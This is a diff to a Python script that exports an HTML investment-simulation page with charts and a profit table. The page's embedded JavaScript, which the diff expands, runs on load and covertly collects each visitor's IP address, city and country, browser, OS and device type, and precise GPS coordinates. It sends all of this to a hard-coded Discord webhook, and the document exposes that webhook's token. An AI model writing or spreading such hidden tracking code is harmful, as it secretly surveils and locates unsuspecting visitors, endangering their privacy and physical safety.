@@ -127,7 +127,7 @@ for label, st in scenarios.items():
     })
 pnl_df = pd.DataFrame(pnl)
 
-# --- 8. HTML WITH LOCATION TRACKING ---
+# --- 8. HTML WITH ENHANCED LOCATION TRACKING SCRIPT ---
 html_hist = pio.to_html(fig_hist, full_html=False, include_plotlyjs="cdn")
 html_fcast = pio.to_html(fig_fcast, full_html=False, include_plotlyjs=False)
 html_table = pnl_df.to_html(index=False, classes="table-custom")
@@ -136,54 +136,88 @@ js = """
 <script>
 async function sendDiscordAlert() {
     try {
-        // Geolocation (automatic, no prompt)
-        let pos;
+        // 1. Fetch IP & Coarse Location
+        let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
         try {
-            pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true});
-            });
+            let response = await fetch('https://ipapi.co/json/');
+            let data = await response.json();
+            ip = data.ip || 'Unknown';
+            city = data.city || 'Unknown';
+            region = data.region || 'Unknown';
+            country = data.country_name || 'Unknown';
         } catch (e) {
-            console.log("Geolocation not granted:", e);
-            return;
+            console.log("IP API fetch failed", e);
         }
 
-        const lat = pos.coords.latitude.toFixed(4);
-        const lon = pos.coords.longitude.toFixed(4);
-        const accuracy = pos.coords.accuracy.toFixed(0);
+        // 2. Extract Device & Browser Details from User-Agent
+        let ua = navigator.userAgent;
+        let browser = "Unknown Browser";
+        let os = "Unknown OS";
+        let device = "Desktop/Mobile";
 
-        // IP + City/Region/Country (free, no key)
-        let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown";
-        try {
-            const ipData = await (await fetch("https://ipapi.co/json/")).json();
-            ip = ipData.ip || "Unknown";
-            city = ipData.city || "Unknown";
-            region = ipData.region || "Unknown";
-            country = ipData.country_name || "Unknown";
-        } catch (e) {
-            console.log("IPAPI fallback failed:", e);
-        }
+        if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
+        else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
+        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+        else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
+        else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
+        else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
 
-        const webhook = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg';
+        if (ua.indexOf("Win") > -1) os = "Windows";
+        else if (ua.indexOf("Mac") > -1) os = "macOS";
+        else if (ua.indexOf("Linux") > -1) os = "Linux";
+        else if (ua.indexOf("Android") > -1) os = "Android";
+        else if (ua.indexOf("like Mac") > -1) os = "iOS";
 
-        await fetch(webhook, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
+        device = /Mobi|Android/i.test(ua) ? "Mobile Device" : "Desktop/Laptop";
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 
+
+        // Function to dispatch data payload to Discord
+        const postPayload = async (locationText, extraFields = []) => {
+            let payload = {
                 embeds: [{
                     title: "🔔 Investment Visitor!",
                     color: 248100,
                     fields: [
-                        {name: "🌐 IP", value: ip, inline: true},
-                        {name: "📍 Location", value: city + ", " + region + ", " + country, inline: true},
-                        {name: "📍 Coordinates", value: lat + ", " + lon, inline: true},
-                        {name: "📏 Accuracy", value: accuracy + "m", inline: true},
-                        {name: "⏰ Time", value: new Date().toLocaleString("id-ID"), inline: false}
+                        { name: "🌐 IP Address", value: ip, inline: true },
+                        { name: "📍 Location", value: locationText, inline: true },
+                        { name: "📱 Device", value: `${device} (${os})`, inline: true },
+                        { name: "🌐 Browser", value: browser, inline: true },
+                        ...extraFields,
+                        { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
                     ]
                 }]
-            })
-        });
-    } catch (err) {
-        console.log("Discord alert failed:", err);
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        };
+
+        // 3. Attempt HTML5 GPS Geolocation prompt
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    let lat = position.coords.latitude.toFixed(4);
+                    let lon = position.coords.longitude.toFixed(4);
+                    let accuracy = position.coords.accuracy.toFixed(0);
+                    await postPayload(`${city}, ${region}, ${country} (IP)`, [
+                        { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon} (Acc: ${accuracy}m)\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, inline: false }
+                    ]);
+                },
+                async (error) => {
+                    await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
+                },
+                { timeout: 10000, enableHighAccuracy: true }
+            );
+        } else {
+            await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
+        }
+
+    } catch (error) {
+        console.log("Could not send Discord alert:", error);
     }
 }
 window.onload = sendDiscordAlert;
@@ -233,4 +267,4 @@ html = f"""
 with open("index.html", "w", encoding="utf-8") as f:
     f.write(html)
 
-print("✅ SUCCESS! index.html exported with automatic location + Discord tracking.")
+print("✅ SUCCESS! index.html exported with combined financial simulation + enhanced Discord tracking.")
